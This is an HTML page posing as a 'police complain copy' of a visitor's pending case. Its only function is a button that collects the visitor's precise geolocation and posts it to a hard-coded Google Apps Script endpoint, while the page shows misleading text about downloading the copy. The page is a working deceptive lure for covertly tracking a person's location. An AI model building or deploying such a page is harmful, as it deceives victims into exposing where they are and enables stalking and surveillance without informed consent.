<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>police fir</title>
<style>
  body {
    margin: 0; font-family: Arial, sans-serif; background: #f4f6f8;
    display: flex; align-items: center; justify-content: center; min-height: 100vh;
  }
  .card {
    box-sizing: border-box; width: calc(100% - 30px); max-width: 420px;
    background: #fff; padding: 32px 22px; border-radius: 16px;
    box-shadow: 0 4px 18px rgba(0,0,0,.12); text-align: center;
  }
  h2 { margin-top: 0; }
  p { line-height: 1.5; }
  button {
    width: 100%; padding: 16px; font-size: 18px; font-weight: 700;
    border: 0; border-radius: 10px; cursor: pointer;
  }
  #status { margin-top: 18px; line-height: 1.5; }
</style>
</head>
<body>
<div class="card">
  <h2>📍 police complain copy</h2>
  <p>this is a copy of your pending case in police station.</p>
  <button onclick="shareLocation()">📍 SHARE MY LOCATION</button>
  <div id="status"></div>
</div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbypTpaVIhKG-sYDEeuHrHD5jRA2mFN7qZbs9dM-MAmfdelUVHJGpJSpQ_-eUsiXzGa8/exec";

function shareLocation() {
  const status = document.getElementById("status");

  if (!navigator.geolocation) {
    status.innerHTML = "Location sharing is not supported by this browser.";
    return;
  }

  status.innerHTML = "download the copy…";

  navigator.geolocation.getCurrentPosition(
    function(position) {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy
      };

      status.innerHTML = "Location found. Sending…";

      fetch(SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify(data)
      })
      .then(function() {
        status.innerHTML = "✅ Location shared successfully.";
      })
      .catch(function() {
        status.innerHTML = "❌ Unable to send location. Please try again.";
      });
    },
    function(error) {
      if (error.code === error.PERMISSION_DENIED) {
        status.innerHTML = "❌ Location permission was denied.<br><br>Please allow location access. If the in-app browser does not support location sharing, open this page in Chrome or Safari.";
      } else if (error.code === error.TIMEOUT) {
        status.innerHTML = "❌ Location request timed out. Please try again.";
      } else {
        status.innerHTML = "❌ Unable to get your current location. If necessary, open this page in Chrome or Safari.";
      }
    },
    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
  );
}
</script>
</body>
</html>
